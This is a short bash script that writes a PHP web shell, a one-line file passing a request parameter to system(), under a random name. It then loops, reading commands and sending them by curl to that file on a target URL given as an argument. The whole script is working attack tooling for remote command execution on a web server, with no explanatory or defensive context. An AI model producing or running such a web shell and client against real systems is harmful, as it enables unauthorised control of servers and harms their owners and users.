#!/bin/bash

#$1 url
command1="$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)"
shell="<?php echo system(\$_REQUEST[\"$command1\"])?>"
echo $shell
echo $shell > $command1.php

while :
do
    if [ $# -gt 0 ]
    then
        echo
        echo -n "$> " ; read -r readcomm
        curl $1/$command1.php?$command1=$readcomm 
    fi
done
